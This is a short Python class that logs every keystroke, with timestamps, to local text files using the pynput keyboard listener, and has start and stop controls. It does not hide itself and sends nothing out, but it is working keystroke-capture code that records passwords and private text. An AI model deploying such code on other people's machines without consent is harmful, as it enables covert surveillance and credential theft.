import os
import datetime
from pynput import keyboard

class KeyLogger:
    def __init__(self, log_folder="logs"):
        self.log_folder = log_folder
        self.log_file = None
        self.listener = None
        self.is_logging = False

        # Create logs folder
        os.makedirs(log_folder, exist_ok=True)

    def start_logging(self):
        if self.is_logging:
            print("Already logging...")
            return

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        file_path = os.path.join(self.log_folder, f"log_{timestamp}.txt")

        # Open fresh log file
        self.log_file = open(file_path, "a", encoding="utf-8")
        self.is_logging = True

        print(f"[+] Logging started → {file_path}")

        # Listener logic
        def on_press(key):
            if not self.is_logging:
                return False

            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
            try:
                k = key.char
            except AttributeError:
                k = str(key)

            self.log_file.write(f"{now} - {k}\n")

        self.listener = keyboard.Listener(on_press=on_press)
        self.listener.start()

    def stop_logging(self):
        if not self.is_logging:
            print("Not logging.")
            return

        self.is_logging = False
        self.listener.stop()
        self.log_file.close()

        print("[+] Logging stopped.")
